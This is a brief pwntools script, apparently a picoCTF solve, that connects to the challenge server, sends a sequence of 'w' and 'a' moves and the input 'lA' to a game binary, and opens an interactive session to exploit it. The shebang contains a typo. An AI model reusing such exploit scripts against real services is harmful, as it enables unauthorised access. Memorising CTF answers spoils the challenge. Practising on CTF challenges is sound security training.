#!/usr/bin/env ioython3

from pwn import *


io = remote("saturn.picoctf.net", 58986)

ELF("./game")

for i in range(4):
    io.sendline("w")
for i in range(8):
    io.sendline("a")

io.sendline("lA")
io.sendline("p")

io.interactive()
